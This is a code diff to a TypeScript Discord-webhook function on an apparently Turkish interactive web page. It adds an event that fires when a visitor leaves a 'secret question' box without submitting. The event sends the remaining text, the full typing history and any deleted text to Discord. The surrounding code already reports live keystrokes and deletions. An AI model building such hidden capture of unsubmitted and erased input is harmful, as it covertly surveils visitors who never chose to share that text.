@@ -135,6 +135,10 @@ export async function sendDiscordWebhook(
       title = '✍️ Gizli Soruya Canlı Yazılıyor...';
       color = 3801080; // Sky Blue #3a86ff
       description = `✍️ **Ziyaretçi "Ne görmek istiyorsun?" sorusuna canlı yazıyor:**\n\n**"${data.letterText || data.answer || '-'}"**\n\n🔤 **Tüm Yazılanlar (Silinenler Dahil):** "${data.allTypedHistory || data.letterText || '-'}"${data.deletedText ? `\n✂️ **Silinen Kısımlar:** "${data.deletedText}"` : ''}`;
+    } else if (eventType === 'secret_input_unfocused') {
+      title = '✍️ Ziyaretçi Yazmayı Bıraktı / Kutudan Çıktı';
+      color = 16750848; // Amber Orange #fa8c16
+      description = `✍️ **Ziyaretçi yazı kutusundan çıktı (Gönder butonuna basmadı):**\n\n📝 **Kutuda Kalan Metin:** "${data.letterText || data.answer || '-'}"\n\n🔤 **Tüm Yazılanlar:** "${data.allTypedHistory || data.letterText || '-'}"${data.deletedText ? `\n✂️ **Silinen Kısımlar:** "${data.deletedText}"` : ''}`;
     } else if (eventType === 'secret_input_submitted') {
       title = '📩 GİZLİ SORUYA CEVAP GÖNDERİLDİ!';
       color = 16723558; // Bright Crimson #ff1493
@@ -344,7 +348,7 @@ export async function sendDiscordWebhook(
         ? 'last_scroll_started'
         : (eventType === 'last_page_abandoned' ? 'visitor_left_page'
         : (eventType === 'secret_input_submitted' ? 'letter_submitted'
-        : (eventType === 'secret_input_typed' || eventType === 'secret_input_draft' || eventType === 'secret_input_deleted' ? 'letter_draft_update'
+        : (eventType === 'secret_input_typed' || eventType === 'secret_input_draft' || eventType === 'secret_input_deleted' || eventType === 'secret_input_unfocused' ? 'letter_draft_update'
         : (eventType === 'secret_button_clicked' ? 'last_user_click' : eventType))));
 
       const rawVars = [
